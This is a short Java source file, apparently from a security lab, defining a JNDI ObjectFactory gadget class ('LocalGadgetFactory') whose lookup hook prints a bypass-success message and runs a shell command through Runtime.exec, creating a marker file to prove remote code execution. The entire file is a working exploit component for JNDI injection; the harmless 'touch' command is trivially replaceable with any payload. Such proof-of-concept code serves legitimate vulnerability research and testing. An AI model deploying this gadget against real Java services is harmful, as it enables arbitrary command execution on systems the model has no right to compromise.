package lab;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public class LocalGadgetFactory implements ObjectFactory {
    public LocalGadgetFactory() {}

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        System.out.println("\n[!] JNDI Local Gadget Bypass Success!");
        Runtime.getRuntime().exec("touch /tmp/gadget_rce_success");
        return "EXPLOITED_SUCCESS";
    }
}
